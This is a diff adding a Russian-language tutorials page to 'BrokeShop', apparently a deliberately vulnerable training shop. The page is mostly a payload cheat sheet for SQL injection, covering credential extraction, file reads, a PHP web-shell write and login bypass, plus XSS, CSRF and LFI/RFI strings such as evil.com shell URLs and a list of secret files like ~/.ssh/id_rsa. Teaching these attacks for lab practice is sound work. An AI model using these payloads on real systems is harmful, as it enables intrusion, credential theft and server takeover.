@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Полное руководство по безопасности - BrokeShop</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/tutorials.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #4a6bdf;
+            --button-bg: #4a6bdf;
+            --button-hover: #3a56c8;
+            --text-color: #333;
+            --background: #f5f5f5;
+            --card-bg: #fff;
+            --border-color: #e0e0e0;
+            --shadow-color: rgba(0, 0, 0, 0.1);
+        }
+        
+        body.dark-theme {
+            --text-color: #f0f0f0;
+            --background: #1a1a1a;
+            --card-bg: #2d2d2d;
+            --border-color: #444;
+            --shadow-color: rgba(0, 0, 0, 0.3);
+        }
+    </style>
+    <style>
+        .security-guide {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        
+        .security-section {
+            margin-bottom: 3rem;
+            background: var(--card-bg);
+            border-radius: 8px;
+            padding: 1.5rem;
+            box-shadow: 0 2px 8px var(--shadow-color);
+        }
+        
+        .security-section h2 {
+            color: var(--primary-color);
+            border-bottom: 2px solid var(--border-color);
+            padding-bottom: 0.5rem;
+            margin-top: 0;
+        }
+        
+        .code-block {
+            background: #2d2d2d;
+            color: #f0f0f0;
+            padding: 1rem;
+            border-radius: 4px;
+            overflow-x: auto;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+        
+        .note {
+            background: #fff8e1;
+            border-left: 4px solid #ffc107;
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 0 4px 4px 0;
+        }
+        
+        .note p {
+            margin: 0;
+            color: #5d4037;
+        }
+        
+        .back-button {
+            display: inline-block;
+            margin-bottom: 1.5rem;
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .back-button:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body class="<%= typeof darkTheme !== 'undefined' && darkTheme ? 'dark-theme' : '' %>">
+    <!-- Theme Toggle -->
+    <div class="theme-toggle" onclick="toggleTheme()" title="Переключить тему">
+        <i class="fas fa-moon"></i>
+    </div>
+    <!-- Header and Navigation -->
+    <header>
+        <nav class="navbar">
+            <div class="nav-container">
+                <div class="nav-brand">
+                    <a href="/shop">BrokeShop</a>
+                </div>
+                <div class="nav-menu">
+                    <% if (typeof user !== 'undefined' && user) { %>
+                        <div class="nav-user">
+                            <span>Привет, <%= user %>!</span>
+                            <div class="nav-links">
+                                <a href="/shop" class="nav-link">
+                                    <i class="fas fa-store"></i> Товары
+                                </a>
+                                <a href="/tutorials" class="nav-link active">
+                                    <i class="fas fa-book"></i> Туториалы
+                                </a>
+                                <a href="/cart" class="nav-link">
+                                    <i class="fas fa-shopping-cart"></i> Корзина
+                                    <% if (typeof cartCount !== 'undefined' && cartCount > 0) { %>
+                                        <span class="cart-count"><%= cartCount %></span>
+                                    <% } %>
+                                </a>
+                                <a href="/cart/orders" class="nav-link">
+                                    <i class="fas fa-clipboard-list"></i> Заказы
+                                </a>
+                                <% if (typeof userRole !== 'undefined' && (userRole === 'admin' || userRole === 'root')) { %>
+                                    <a href="/admin" class="nav-link">
+                                        <i class="fas fa-cog"></i> Админ-панель
+                                    </a>
+                                <% } %>
+                                <form action="/auth/logout" method="POST" style="display: inline;">
+                                    <button type="submit" class="nav-link logout-btn">
+                                        <i class="fas fa-sign-out-alt"></i> Выйти
+                                    </button>
+                                </form>
+                            </div>
+                        </div>
+                    <% } else { %>
+                        <div class="nav-links">
+                            <a href="/auth/login" class="nav-link">Вход</a>
+                            <a href="/auth/register" class="nav-link">Регистрация</a>
+                        </div>
+                    <% } %>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <main class="security-guide">
+        <a href="/tutorials" class="back-button">
+            <i class="fas fa-arrow-left"></i> Назад к списку туториалов
+        </a>
+        
+        <h1>Полное руководство по SQL Injection</h1>
+        
+        <div class="security-section">
+            <h2>Обнаружение уязвимости</h2>
+            <p>Проверяем, реагирует ли приложение на специальные символы SQL:</p>
+            <div class="code-block">
+                <pre><code>' 
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+' OR '1'='1' --</code></pre>
+            </div>
+            <div class="note">
+                <p>Если приложение ведет себя по-разному - возможно, есть уязвимость.</p>
+            </div>
+        </div>
+
+        <div class="security-section">
+            <h2>Определение структуры базы данных</h2>
+            <p>Узнаем сколько колонок возвращает запрос и какие из них отображаются:</p>
+            <div class="code-block">
+                <pre><code>' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--</code></pre>
+            </div>
+            <div class="note">
+                <p>ORDER BY помогает найти количество колонок, UNION проверяет какие колонки видны на странице.</p>
+            </div>
+        </div>
+
+        <div class="security-section">
+            <h2>Извлечение системной информации</h2>
+            <p>Получаем информацию о базе данных и пользователе:</p>
+            <div class="code-block">
+                <pre><code>' UNION SELECT 1,@@version,3--
+' UNION SELECT 1,version(),3--
+' UNION SELECT 1,database(),3--
+' UNION SELECT 1,user(),3--
+' UNION SELECT 1,current_user,3--</code></pre>
+            </div>
+            <div class="note">
+                <p>Эти запросы показывают версию СУБД, имя базы данных и текущего пользователя.</p>
+            </div>
+        </div>
+
+        <div class="security-section">
+            <h2>Получение структуры таблиц</h2>
+            <p>Узнаем какие таблицы и колонки есть в базе данных:</p>
+            <div class="code-block">
+                -- Для MySQL
+                <pre><code>-- Для MySQL
+' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
+
+-- Для SQL Server
+' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
+' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--</code></pre>
+            </div>
+            <div class="note">
+                <p>information_schema содержит метаинформацию о всех таблицах и колонках.</p>
+            </div>
+        </div>
+
+        <div class="security-section">
+            <h2>Извлечение данных пользователей</h2>
+            <p>Получаем реальные данные из таблиц пользователей:</p>
+            <div class="code-block">
+                <pre><code>' UNION SELECT 1,username,password FROM users--
+' UNION SELECT 1,CONCAT(username,':',password),3 FROM users--
+' UNION SELECT 1,CONCAT(username,':',password),3 FROM admin_users--</code></pre>
+            </div>
+            <div class="note">
+                <p>Эти запросы извлекают логины и пароли из таблиц пользователей.</p>
+            </div>
+        </div>
+
+        <div class="security-section">
+            <h2>Чтение файлов</h2>
+            <p>Пытаемся прочитать системные файлы через БД:</p>
+            <div class="code-block">
+                <pre><code>' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
+' UNION SELECT 1,LOAD_FILE('C:/windows/system32/drivers/etc/hosts'),3--</code></pre>
+            </div>
+            <div class="note">
+                <p>LOAD_FILE позволяет читать файлы из файловой системы сервера.</p>
+            </div>
+        </div>
+
+        <div class="security-section">
+            <h2>Запись файлов</h2>
+            <p>Создаем файлы на сервере (например, веб-шелл):</p>
+            <div class="code-block">
+                <pre><code>' UNION SELECT 1,'<?php system($_GET[cmd]); ?>',3 INTO OUTFILE '/var/www/shell.php'--
+' UNION SELECT 1,'<?php system($_GET[cmd]); ?>',3 INTO OUTFILE 'C:/xampp/htdocs/shell.php'--</code></pre>
+            </div>
+            <div class="note">
+                <p>INTO OUTFILE создает файлы на сервере. Это может быть использовано для загрузки веб-шеллов.</p>
+            </div>
+        </div>
+
+        <div class="security-section">
+            <h2>Слепая SQL инъекция</h2>
+            <p>Используем когда результаты не видны напрямую:</p>
+            <div class="code-block">
+                <pre><code>' AND SUBSTRING(database(),1,1)='a'--
+' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
+' AND (SELECT COUNT(*) FROM users) > 10--</code></pre>
+            </div>
+            <div class="note">
+                <p>Проверяем условия по поведению приложения или времени ответа.</p>
+            </div>
+        </div>
+
+        <div class="security-section">
+            <h2>Временные задержки</h2>
+            <p>Используем задержки для подтверждения уязвимости:</p>
+            <div class="code-block">
+                <pre><code>' AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+'; WAITFOR DELAY '00:00:05'--</code></pre>
+            </div>
+            <div class="note">
+                <p>Если запрос выполняется дольше - уязвимость подтверждена.</p>
+            </div>
+        </div>
+
+        <div class="security-section">
+            <h2>Обход аутентификации</h2>
+            <p>Самые простые payloads для входа без пароля:</p>
+            <div class="code-block">
+                <pre><code>admin' --
+admin' OR '1'='1
+' OR 1=1--
+' OR '1'='1' --</code></pre>
+            </div>
+            <div class="note">
+                <p>Комментарии (--) обрезают проверку пароля, OR 1=1 делает условие всегда истинным.</p>
+            </div>
+        </div>
+
+        <div class="security-section">
+            <h2>🔍 Blind SQL Injection - Объяснение Простым Языком</h2>
+            
+            <h3>🤔 Что это такое?</h3>
+            <p>Blind SQL Injection - это как угадывать пароль от замка, не видя самого замка.</p>
+            
+            <div class="note">
+                <p>🚪 Обычная SQL-инъекция - вы видите, что написано на бумажке внутри (данные из базы)</p>
+                <p>🚪 Blind SQL-инъекция - вы только слышите, щелкает ли замок или нет</p>
+            </div>
+
+            <h3>🎭 Два основных типа</h3>
+            
+            <h4>1. Boolean-Based (По ответу "Да/Нет")</h4>
+            <div class="code-block">
+                <pre><code># Спрашиваем: "Первый символ пароля - 'a'?"
+# Если ДА - сайт показывает товар
+# Если НЕТ - сайт говорит "товара нет"
+
+# Пример:
+site.com/product?id=1 AND password LIKE 'a%'</code></pre>
+            </div>
+            <div class="note">
+                <p>✅ Если условие ВЕРНО - сайт ведет себя нормально</p>
+                <p>❌ Если условие НЕВЕРНО - сайт выдает ошибку или другой контент</p>
+                <p>🔍 Мы перебираем варианты и смотрим на реакцию сайта</p>
+            </div>
+
+            <h4>2. Time-Based (По времени ответа)</h4>
+            <div class="code-block">
+                <pre><code># Спрашиваем: "Первый символ пароля - 'a'?"
+# Если ДА - подожди 5 секунд ответа
+# Если НЕТ - ответи сразу
+
+# Пример:
+site.com/product?id=1 AND IF(password LIKE 'a%', SLEEP(5), 0)</code></pre>
+            </div>
+            <div class="note">
+                <p>⏱️ Если условие ВЕРНО - сайт "задумывается" на несколько секунд</p>
+                <p>🚀 Если условие НЕВЕРНО - сайт отвечает быстро</p>
+                <p>⏰ Мы измеряем время ответа и делаем выводы</p>
+            </div>
+
+            <h3>🧩 Как взламывают посимвольно?</h3>
+            <p>Процесс напоминает угадывание слова:</p>
+            
+            <h4>Шаг 1: Узнаем длину пароля</h4>
+            <div class="code-block">
+                <pre><code>"Пароль состоит из 8 символов?" ✅ ДА
+"Пароль состоит из 9 символов?" ❌ НЕТ
+→ Значит пароль из 8 символов</code></pre>
+            </div>
+
+            <h4>Шаг 2: Угадываем первый символ</h4>
+            <div class="code-block">
+                <pre><code>"Первый символ - 'a'?" ❌ НЕТ
+"Первый символ - 'b'?" ❌ НЕТ  
+"Первый символ - 'c'?" ✅ ДА
+→ Первый символ 'c'</code></pre>
+            </div>
+
+            <h4>Шаг 3: Угадываем второй символ</h4>
+            <div class="code-block">
+                <pre><code>"Второй символ - 'a'?" ❌ НЕТ
+"Второй символ - 'd'?" ✅ ДА
+→ Второй символ 'd'</code></pre>
+            </div>
+        </div>
+        </div>
+
+        <!-- XSS Section -->
+        <div class="security-section">
+            <h2>XSS (Межсайтовый скриптинг)</h2>
+            
+            <h3>Reflected XSS</h3>
+            <p>Полезная нагрузка отражается от веб-сервера в ответе:</p>
+            <div class="code-block">
+                http://example.com/search?q=&lt;script>alert('XSS')&lt;/script>
+            </div>
+
+            <h3>Stored XSS</h3>
+            <p>Вредоносный скрипт сохраняется на сервере и выполняется при каждом обращении к странице:</p>
+            <div class="code-block">
+                &lt;script>alert('XSS')&lt;/script>
+                &lt;img src="x" onerror="alert('XSS')">
+                &lt;body onload=alert('XSS')>
+            </div>
+
+            <h3>DOM-based XSS</h3>
+            <p>Уязвимость в клиентском коде, которая манипулирует DOM:</p>
+            <div class="code-block">
+                // Уязвимый код
+                document.write(location.hash.substring(1));
+                
+                // Эксплуатация
+                http://example.com/page#&lt;script>alert('XSS')&lt;/script>
+            </div>
+        </div>
+
+        <!-- CSRF Section -->
+        <div class="security-section">
+            <h2>CSRF (Межсайтовая подделка запроса)</h2>
+            
+            <h3>Пример уязвимой формы</h3>
+            <div class="code-block">
+                &lt;img src="https://bank.com/transfer?to=attacker&amount=1000">
+                
+                &lt;form action="https://bank.com/transfer" method="POST">
+                    &lt;input type="hidden" name="to" value="attacker">
+                    &lt;input type="hidden" name="amount" value="1000">
+                    &lt;input type="submit" value="View my pictures!">
+                &lt;/form>
+            </div>
+
+            <h3>Защита (CSRF-токен)</h3>
+            <div class="code-block">
+                &lt;form action="/transfer" method="POST">
+                    &lt;input type="hidden" name="csrf_token" value="RANDOM_STRING">
+                    &lt;!-- остальные поля формы -->
+                &lt;/form>
+            </div>
+            
+            <div class="note">
+                <p>Сервер должен проверять наличие и валидность CSRF-токена для каждого состояния, изменяющего запроса.</p>
+            </div>
+        </div>
+
+        <!-- File Inclusion Section -->
+        <div class="security-section">
+            <h2>LFI/RFI (Включение локальных/удаленных файлов)</h2>
+            
+            <h3>LFI (Local File Inclusion)</h3>
+            <div class="code-block">
+                /etc/passwd
+                ../../../../etc/passwd
+                %00 (null byte) обход
+                ....//....//etc/passwd
+                /var/www/.env
+            </div>
+
+            <h3>RFI (Remote File Inclusion)</h3>
+            <div class="code-block">
+                http://evil.com/shell.txt?
+                http://evil.com/shell.txt%00
+                http://evil.com/shell.txt%00.jpg
+            </div>
+            
+            <h3>Полезные файлы в Linux</h3>
+            <div class="code-block">
+                /etc/passwd
+                /etc/shadow
+                /etc/hosts
+                /etc/issue
+                /proc/self/environ
+                /var/log/auth.log
+                ~/.bash_history
+                ~/.ssh/id_rsa
+            </div>
+        </div>
+
+        <!-- Security Headers -->
+        <div class="security-section">
+            <h2>Заголовки безопасности</h2>
+            
+            <h3>Content Security Policy (CSP)</h3>
+            <div class="code-block">
+                Content-Security-Policy: default-src 'self';
+                Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';
+                Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self';
+            </div>
+
+            <h3>Другие важные заголовки</h3>
+            <div class="code-block">
+                X-Content-Type-Options: nosniff
+                X-Frame-Options: DENY
+                X-XSS-Protection: 1; mode=block
+                Strict-Transport-Security: max-age=31536000; includeSubDomains
+                Referrer-Policy: no-referrer-when-downgrade
+                Feature-Policy: geolocation 'self' https://example.com
+            </div>
+        </div>
+        <div class="security-section">
+            <h2>🔧 В разработке</h2>
+            
+            <h3>Категория A: Инъекции</h3>
+            <ul>
+                <li>NoSQL Injection</li>
+                <li>Command Injection</li>
+                <li>LDAP Injection</li>
+            </ul>
+
+            <h3>Категория B: XSS атаки</h3>
+            <ul>
+                <li>DOM-based XSS</li>
+                <li>XSS через загрузку файлов</li>
+            </ul>
+
+            <h3>Категория C: Broken Access Control</h3>
+            <ul>
+                <li>JWT Manipulation</li>
+                <li>Privilege Escalation</li>
+                <li>CORS Misconfiguration</li>
+            </ul>
+
+            <h3>Категория D: Прочие уязвимости</h3>
+            <ul>
+                <li>CSRF (Cross-Site Request Forgery)</li>
+                <li>SSRF (Server-Side Request Forgery)</li>
+                <li>XXE (XML External Entity)</li>
+                <li>File Upload Bypass</li>
+                <li>Insecure Deserialization</li>
+                <li>Security Misconfiguration</li>
+                <li>Information Disclosure</li>
+                <li>Broken Authentication</li>
+                <li>Sensitive Data Exposure</li>
+                <li>Using Components with Known Vulnerabilities</li>
+                <li>Insufficient Logging & Monitoring</li>
+            </ul>
+            
+            <div class="note">
+                <p>🔍 Эти разделы находятся в разработке и будут дополнены подробной информацией.</p>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-bottom">
+                <p>&copy; 2025 BrokeShop. Все права защищены.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="/js/script.js"></script>
+    <script>
+        // Theme toggle functionality
+        function toggleTheme() {
+            document.body.classList.toggle('dark-theme');
+            const icon = document.querySelector('.theme-toggle i');
+            if (document.body.classList.contains('dark-theme')) {
+                icon.classList.remove('fa-moon');
+                icon.classList.add('fa-sun');
+                localStorage.setItem('theme', 'dark');
+            } else {
+                icon.classList.remove('fa-sun');
+                icon.classList.add('fa-moon');
+                localStorage.setItem('theme', 'light');
+            }
+        }
+
+        // Check for saved theme preference
+        if (localStorage.getItem('theme') === 'dark' || 
+           (!localStorage.getItem('theme') && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.body.classList.add('dark-theme');
+            const icon = document.querySelector('.theme-toggle i');
+            if (icon) {
+                icon.classList.remove('fa-moon');
+                icon.classList.add('fa-sun');
+            }
+        }
+    </script>
+</body>
+</html>
